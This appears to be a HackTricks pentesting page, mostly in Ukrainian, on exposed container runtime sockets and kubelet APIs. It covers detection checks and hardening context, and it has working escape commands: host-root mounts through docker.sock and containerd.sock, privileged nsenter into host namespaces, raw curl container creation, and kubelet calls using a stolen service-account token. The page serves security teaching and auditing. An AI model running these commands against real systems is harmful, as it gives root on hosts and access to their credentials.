# Runtime API And Daemon Exposure

{{#include ../../../banners/hacktricks-training.md}}

## Overview

Багато реальних компрометацій container не починаються з namespace escape взагалі. Вони починаються з доступу до runtime control plane. Якщо workload може спілкуватися з `dockerd`, `containerd`, CRI-O, Podman, або kubelet через змонтований Unix socket чи exposed TCP listener, attacker може отримати змогу запросити новий container з кращими privileges, змонтувати host filesystem, приєднатися до host namespaces, або отримати sensitive node information. У таких випадках runtime API — це справжня security boundary, і компрометація його функціонально майже дорівнює компрометації host.

Саме тому runtime socket exposure слід документувати окремо від kernel protections. Container зі звичайними seccomp, capabilities, і MAC confinement все одно може бути за один API call від компрометації host, якщо `/var/run/docker.sock` або `/run/containerd/containerd.sock` змонтовано всередину нього. Kernel isolation поточного container може працювати саме так, як задумано, тоді як runtime management plane залишається повністю exposed.

## Daemon Access Models

Docker Engine традиційно exposes свій privileged API через local Unix socket `unix:///var/run/docker.sock`. Історично його також exposed remotely через TCP listeners, такі як `tcp://0.0.0.0:2375` або TLS-protected listener на `2376`. Exposing daemon remotely без сильного TLS і client authentication фактично перетворює Docker API на remote root interface.

containerd, CRI-O, Podman, і kubelet expose подібні surfaces з високим impact. Назви та workflows відрізняються, але логіка — ні. Якщо interface дозволяє caller створювати workloads, монтувати host paths, отримувати credentials, або змінювати running containers, цей interface є privileged management channel і має так і розглядатися.

Common local paths worth checking are:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
Старіші або більш спеціалізовані stacks також можуть надавати endpoints, такі як `dockershim.sock`, `frakti.sock` або `rktlet.sock`. Вони менш поширені в сучасних середовищах, але якщо їх виявлено, до них слід ставитися з тією ж обережністю, оскільки вони є surfaces керування runtime, а не звичайними application sockets.

## Secure Remote Access

Якщо daemon потрібно expose за межі локального socket, connection слід захистити за допомогою TLS і, бажано, mutual authentication, щоб daemon перевіряв client, а client перевіряв daemon. Стара звичка відкривати Docker daemon через plain HTTP для зручності є однією з найнебезпечніших помилок у container administration, тому що API surface достатньо потужний, щоб directly створювати privileged containers.

Історичний Docker configuration pattern виглядав так:
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
На хостах на основі systemd, взаємодія з daemon також може виглядати як `fd://`, що означає, що процес успадковує попередньо відкритий socket від systemd, а не прив’язує його безпосередньо самостійно. Важливий висновок не в точному синтаксисі, а в security consequence. Щойно daemon починає слухати поза межами жорстко обмеженого local socket, transport security і client authentication стають обов’язковими, а не необов’язковим hardening.

## Abuse

Якщо runtime socket присутній, підтвердьте, який саме це socket, чи існує сумісний client, і чи можливий raw HTTP або gRPC access:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```
Ці команди корисні, тому що вони відрізняють мертвий path, змонтований, але недоступний socket, і живий privileged API. Якщо client успішно підключається, наступне питання — чи може API запустити новий container з host bind mount або host namespace sharing.

### When No Client Is Installed

Відсутність `docker`, `podman` або іншого зручного CLI не означає, що socket safe. Docker Engine speaks HTTP over its Unix socket, а Podman expose both Docker-compatible API and Libpod-native API через `podman system service`. Це означає, що minimal environment лише з `curl` все ще може бути достатнім, щоб керувати daemon:
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
-X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```
Це має значення під час post-exploitation, оскільки захисники іноді видаляють звичайні client binaries, але залишають management socket змонтованим. На Podman hosts пам’ятайте, що high-value path відрізняється між rootful і rootless deployments: `unix:///run/podman/podman.sock` для rootful service instances і `unix://$XDG_RUNTIME_DIR/podman/podman.sock` для rootless ones.

### Full Example: Docker Socket To Host Root

If `docker.sock` доступний, класичний escape — це запустити новий container, який монтує host root filesystem, а потім `chroot` у нього:
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
Це забезпечує пряме виконання host-root через Docker daemon. Вплив не обмежується читанням файлів. Опинившись усередині нового container, attacker може змінювати host files, збирати credentials, implant persistence або запускати додаткові privileged workloads.

### Full Example: Docker Socket To Host Namespaces

Якщо attacker надає перевагу входу в namespace замість доступу лише до filesystem:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
Цей шлях досягає хоста, змушуючи runtime створити новий container з явним host-namespace exposure, а не шляхом exploitation поточного.

### Full Example: containerd Socket

Змонтований `containerd` socket зазвичай не менш небезпечний:
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
Якщо присутній більш Docker-like клієнт, `nerdctl` може бути зручнішим за `ctr`, оскільки він підтримує знайомі flags, такі як `--privileged`, `--pid=host` та `-v`:
```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
--privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```
Вплив знову полягає в компрометації хоста. Навіть якщо Docker-specific tooling відсутній, інший runtime API все одно може надати ту саму адміністративну владу. На вузлах Kubernetes, `crictl` також може бути достатнім для reconnaissance і взаємодії з контейнерами, оскільки він напряму звертається до CRI endpoint.

### BuildKit Socket

`buildkitd` легко пропустити, бо його часто сприймають як "just the build backend", але daemon усе ще є privileged control plane. Доступний `buildkitd.sock` може дозволити attacker запускати arbitrary build steps, inspect можливості worker, використовувати local contexts із compromised environment і запитувати dangerous entitlements, такі як `network.host` або `security.insecure`, якщо daemon був налаштований дозволяти їх.

Корисні перші interactions:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```
Якщо daemon приймає build requests, перевірте, чи доступні insecure entitlements:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
--frontend dockerfile.v0 \
--local context=. \
--local dockerfile=. \
--allow network.host \
--allow security.insecure \
--output type=local,dest=/tmp/buildkit-out
```
Точний вплив залежить від конфігурації daemon, але rootful BuildKit service з permissive entitlements — це не безпечна зручність для developer. Розглядайте його як ще одну high-value administrative surface, особливо на CI runners і shared build nodes.

### Kubelet API Over TCP

kubelet — це не container runtime, але він усе одно є частиною node management plane і часто потрапляє в ту саму дискусію про trust boundary. Якщо secure port kubelet `10250` доступний з workload, або якщо node credentials, kubeconfigs, чи proxy rights exposed, attacker може зуміти enumerate Pods, retrieve logs, або execute commands у node-local containers, навіть не торкаючись Kubernetes API server admission path.

Почніть з cheap discovery:
```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```
Якщо шлях proxy kubelet або API-server authorizes `exec`, клієнт із підтримкою WebSocket може перетворити це на code execution в інших containers на node. Саме тому `nodes/proxy` лише з `get` permission є небезпечнішим, ніж здається: request все ще може дістатися kubelet endpoints, які execute commands, а такі direct kubelet interactions не відображаються у звичайних Kubernetes audit logs.

## Checks

Мета цих checks — з’ясувати, чи може container дістатися будь-якої management plane, яка мала б залишатися поза trust boundary.
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```
Що тут цікаво:

- Змонтований runtime socket зазвичай є прямим адміністративним примітивом, а не просто інформаційним витоком.
- TCP listener на `2375` без TLS слід розглядати як умову для remote-compromise.
- Environment variables, такі як `DOCKER_HOST`, часто показують, що workload був навмисно спроєктований для взаємодії з host runtime.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Local Unix socket by default | `dockerd` слухає local socket, і daemon зазвичай rootful | mounting `/var/run/docker.sock`, exposing `tcp://...:2375`, weak or missing TLS on `2376` |
| Podman | Daemonless CLI by default | Для звичайного локального використання не потрібен long-lived privileged daemon; API sockets все ще можуть бути exposed, коли `podman system service` увімкнено | exposing `podman.sock`, running the service broadly, rootful API use |
| containerd | Local privileged socket | Administrative API exposed through the local socket and usually consumed by higher-level tooling | mounting `containerd.sock`, broad `ctr` or `nerdctl` access, exposing privileged namespaces |
| CRI-O | Local privileged socket | CRI endpoint is intended for node-local trusted components | mounting `crio.sock`, exposing the CRI endpoint to untrusted workloads |
| Kubernetes kubelet | Node-local management API | Kubelet should not be broadly reachable from Pods; access may expose pod state, credentials, and execution features depending on authn/authz | mounting kubelet sockets or certs, weak kubelet auth, host networking plus reachable kubelet endpoint |

## References

- [containerd socket exploitation part 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [Kubernetes API Server Bypass Risks](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
